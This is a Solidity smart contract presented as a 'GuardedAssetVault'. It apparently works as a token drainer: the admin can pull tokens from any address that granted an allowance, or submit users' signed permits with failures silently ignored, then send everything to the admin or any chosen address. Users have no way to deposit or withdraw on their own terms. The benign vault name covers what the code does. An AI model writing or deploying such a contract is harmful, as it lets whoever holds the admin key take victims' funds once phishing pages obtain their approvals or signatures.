pragma solidity ^0.8.4;
interface IAssetToken {
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface IAssetTokenPermit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract GuardedAssetVault {
    address public admin;
    address public immutable asset;
    event Inbound(address indexed source, uint256 value);
    event Outbound(address indexed recipient, uint256 value);
    event AdminUpdated(address indexed previousAdmin, address indexed nextAdmin);
    error ZeroAddress();
    error ZeroAmount();
    error NotAdmin();
    error PermitExpired();
    error PullReverted();
    error TransferReverted();
    constructor(address token_) {
        if (token_ == address(0)) revert ZeroAddress();
        admin = msg.sender;
        asset = token_;
    }
    modifier onlyAdmin() {
        if (msg.sender != admin) revert NotAdmin();
        _;
    }
    function capture(address from, uint256 value) external onlyAdmin {
        if (from == address(0)) revert ZeroAddress();
        if (value == 0) revert ZeroAmount();
        if (!IAssetToken(asset).transferFrom(from, address(this), value)) revert PullReverted();
        emit Inbound(from, value);
    }

    function captureWithPermit(
        address user,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external onlyAdmin {
        if (user == address(0)) revert ZeroAddress();
        if (value == 0) revert ZeroAmount();
        if (deadline < block.timestamp) revert PermitExpired();
        try IAssetTokenPermit(asset).permit(user, address(this), value, deadline, v, r, s) {} catch {}
        if (!IAssetToken(asset).transferFrom(user, address(this), value)) revert TransferReverted();
        emit Inbound(user, value);
    }

    function release(uint256 value) external onlyAdmin {
        if (value == 0) revert ZeroAmount();
        if (!IAssetToken(asset).transfer(admin, value)) revert TransferReverted();
        emit Outbound(admin, value);
    }

    function releaseTo(address to, uint256 value) external onlyAdmin {
        if (to == address(0)) revert ZeroAddress();
        if (value == 0) revert ZeroAmount();
        if (!IAssetToken(asset).transfer(to, value)) revert TransferReverted();
        emit Outbound(to, value);
    }

    function setAdmin(address next) external onlyAdmin {
        if (next == address(0)) revert ZeroAddress();
        address prev = admin;
        admin = next;
        emit AdminUpdated(prev, next);
    }

    function heldBalance() external view returns (uint256) {
        return IAssetToken(asset).balanceOf(address(this));
    }

    function releaseAll() external onlyAdmin {
        uint256 bal = IAssetToken(asset).balanceOf(address(this));
        if (bal == 0) revert ZeroAmount();
        if (!IAssetToken(asset).transfer(admin, bal)) revert TransferReverted();
        emit Outbound(admin, bal);
    }
}